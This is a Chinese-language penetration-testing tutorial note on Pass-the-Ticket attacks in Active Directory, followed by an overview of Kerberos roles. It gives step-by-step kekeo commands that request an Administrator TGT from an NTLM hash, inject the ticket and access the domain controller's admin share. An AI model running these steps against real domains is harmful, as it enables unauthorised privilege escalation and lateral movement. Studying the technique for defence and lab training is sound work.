---
title: 【后渗透】票据传递攻击
---
## 票据传递攻击

> 票据传递（Pass the Ticket，PtT），使用 Kerberos票据，不需要管理员权限，攻击有效期是在票据有效期之内(一般为7天)。
>
> 在微软活动目录中颁发的TGT是可移植的，由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。
>
> 这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。
>
> 新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。

工具kekeo：https://github.com/gentilkiwi/kekeo/releases 

（1）在当前目录生成一个高权限票据文件

```bash
kekeo.exe "tgt::ask /user:Administrator /domain:wintrysec.lab /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed" exit
```

（2）使用系统自带命令，清除内存中的票据

```baash
klist purge
```

（3）将票据文件导入内存

```bash
kekeo "kerberos::ptt TGT_administrator@WINTRYSEC.LAB_krbtgt~wintrysec.lab@WINTRYSEC.LAB.kirbi" exit
```

（4）列出远程主机的文件

```bash
dir \\DC\c$
```

`比较典型的金票和银票留域后门就是票据传递攻击`

## Kerberos认证协议

Kerberos是一种基于票据的集中式的认证方式，认证过程涉及到三方：Client、Server、KDC。

在Windows域环境中，KDC的角色常常由DC（域控制器）来担任。

票据（Ticket）用来安全的在认证服务器和用户请求的服务之间传递用户的身份。

> **KDC**（Key Distribution Center）：密钥分发中心，kerberos认证服务器，由AS和TGS组成，在认证中会访问 AD数据库；
>
> **AS**（Authentication Server）：身份认证服务
>
> **TGS**（Ticket Granting Server）：票据授予服务，该服务提供的票据为（**白银票据**）
>
> **TGT**（Ticket Granting Ticket）：身份认证服务授予的票据（**黄金票据**），用于身份认证，存储在内存，默认有效期为10小时

在域环境中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。

------

关于内网协议的深入研究可以参考 daiker 师傅的总结（Kerberos、NTML、LDAP）

地址：https://daiker.gitbook.io/windows-protocol/ 